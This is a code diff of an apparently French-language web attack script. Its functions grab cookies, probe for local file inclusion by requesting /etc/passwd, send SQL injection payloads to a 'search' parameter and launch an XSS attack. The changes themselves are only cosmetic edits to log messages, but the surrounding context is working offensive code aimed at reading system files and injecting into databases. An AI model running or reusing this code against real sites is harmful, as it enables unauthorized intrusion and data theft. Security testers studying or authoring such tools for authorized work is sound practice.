@@ -35,21 +35,21 @@ def get_cookies(url):
             print(colored(f"[+] Cookies récupérés : {cookies}", "green"))
             return cookies
         else:
-            print(colored("[-] Aucun cookie trouvé.", "red"))
+            print(colored("[RAPPORT 🦠] Aucun cookie trouvé.", "red"))
             return None
     except requests.exceptions.RequestException as e:
         print(colored(f"[!] Erreur lors de la récupération des cookies : {e}", "red"))
         return None
 
 def lfi_test(url, file_path="/etc/passwd"):
-    print(colored("[*] Test LFI en cours...", "yellow"))
+    print(colored("[INFO 🅾️] Test LFI en cours...", "yellow"))
     try:
         response = requests.get(url, params={"file": file_path}, timeout=10)
         if response.status_code == 200 and "root:" in response.text:
             print(colored(f"[+] Inclusion réussie avec le fichier : {file_path}", "green"))
             return response.text[:500]  # Limiter l'affichage
         else:
-            print(colored("[-] Inclusion échouée.", "red"))
+            print(colored("[INFO⛔] Inclusion échouée.", "red"))
             return None
     except requests.exceptions.RequestException as e:
         print(colored(f"[!] Erreur lors du test LFI : {e}", "red"))
@@ -94,6 +94,8 @@ def advanced_sql_injection_test(url):
         response = requests.get(url, params={'search': payload})
         if "Welcome" in response.text:
             print(f"[+] Injection réussie avec le payload: {payload}")
+        else:
+            print(colored(f"[-] L'injection avec le payload {payload} a échoué.", "red"))
 
 def xss_attack(url):
     print(colored("[*] Lancement de l'attaque XSS (Cross-Site Scripting)...", "yellow"))
